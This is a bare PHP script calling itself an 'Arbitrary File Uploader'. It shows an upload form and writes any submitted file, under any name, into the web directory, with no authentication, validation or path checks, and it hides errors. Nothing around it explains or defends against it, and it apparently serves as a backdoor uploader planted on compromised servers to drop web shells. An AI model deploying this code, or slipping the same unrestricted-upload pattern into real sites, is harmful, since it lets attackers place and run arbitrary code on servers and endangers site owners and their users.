<?php
echo "PHP Arbitrary File Uploader";
echo "<form method=\"post\" enctype=\"multipart/form-data\">";
echo "<input type=\"file\" name=\"up\">";
echo "<input type=\"submit\" name=\"upload\" value=\"upload\">";
echo "</form>";

if($_POST['upload']) {
	if(@copy($_FILES['up']['tmp_name'], $_FILES['up']['name'])) {
		echo "Success!";
	}
	else {
		echo "Failed.";
	}
}
?>
